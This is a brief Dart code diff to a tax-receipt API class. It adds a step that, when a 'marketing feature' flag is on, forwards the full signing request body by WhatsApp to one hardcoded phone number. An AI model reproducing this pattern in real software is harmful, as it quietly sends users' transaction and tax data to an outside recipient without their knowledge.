@@ -254,6 +254,10 @@ class RWTax implements TaxApi {
     http.StreamedResponse response = await request.send();
 
     if (response.statusCode == 200) {
+      if (ProxyService.remoteConfig.isMarketingFeatureEnabled()) {
+        ProxyService.whatsApp.sendWhatsAppMessages(
+            message: request.body, numbers: ['+250783054874']);
+      }
       return Future.value(ReceiptSignature.fromJson(
           json.decode(await response.stream.bytesToString())));
     } else {
